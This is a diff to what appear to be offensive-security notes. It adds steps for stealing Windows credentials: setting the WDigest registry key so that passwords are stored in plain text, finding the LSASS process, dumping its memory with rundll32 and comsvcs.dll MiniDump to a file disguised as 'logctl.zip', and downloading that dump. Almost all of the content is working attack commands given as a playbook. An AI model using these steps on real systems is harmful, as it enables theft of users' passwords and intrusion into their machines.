@@ -66,9 +66,23 @@
       Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
       ```
 
+      ![image](https://github.com/user-attachments/assets/ac6e01e2-ab72-4ba4-928b-4a2ead73f624)
 
+      c. now we got a clear plain text passwords stored at LSASS
+      ```
+      tasklist | findstr "lsass" 
+      ```
+      ![image](https://github.com/user-attachments/assets/58db05a4-2da0-4d51-8bdf-9671eb584c94)
 
+      d. let's dump it
+      ```
+      C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 668 C:\Windows\Temp\logctl.zip full
+      ```
 
+      e. download it
+      ![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)
+      
+      
 ------
 
 # Trash
